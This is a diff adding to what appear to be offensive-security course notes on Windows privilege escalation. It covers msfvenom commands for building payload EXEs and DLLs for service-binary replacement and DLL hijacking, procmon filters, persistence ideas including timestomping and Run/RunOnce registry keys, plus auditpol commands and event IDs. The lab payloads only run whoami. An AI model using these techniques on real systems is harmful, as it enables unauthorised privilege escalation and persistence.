@@ -66,3 +66,68 @@ run executable
 LINOPS> msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
 Windows> SCP from LinOps
 ```
+## Exe Replacement 
+```
+## Find a User created service that you can Rename
+## Must be able to write to directory/rename file
+## backupfile
+
+msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe
+scp student@x.x.x.x:/home/student/putty.exe C:\users\student\desktop
+```
+## DLL Hijacking
+```
+Run procmon --> https://live.sysinternals.com/
+-- filters ---
+process name contains filename.exe
+path contains .dll
+result is NAME NOT FOUND
+-------
+run executable
+
+LINOPS> msfvenom -p windows/exec CMD='cmd.exe C/ "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
+Windows> SCP from LinOps
+
+## if process gets hung up and need to run again
+(get-process | ? {$.name -contains "file"}).kill()
+```
+## Persistance
+```
+System changes or binary uploads that provide the adversary continued access to system
+Survives:
+    Reboots
+    Credential changes
+    DHCP IP reassignment
+    Etc.
+
+Considerations include:
+    File naming
+    File location
+    Timestomping
+    Port selection
+```
+## Registry
+```
+    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
+        Run
+        RunOnce
+
+    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
+        Run
+        RunOnce
+```
+## Audit Logging
+```
+Show all audit category settings
+auditpol /get /category:*
+
+Shows what is actually being logged
+auditpol /get /category:* | findstr /i "success failure"
+```
+## Important Microsoft Event IDs
+```
+4624/4625  Successful/failed login
+4720       Account created
+4672       Administrative user logged on
+7045       Service created
+```
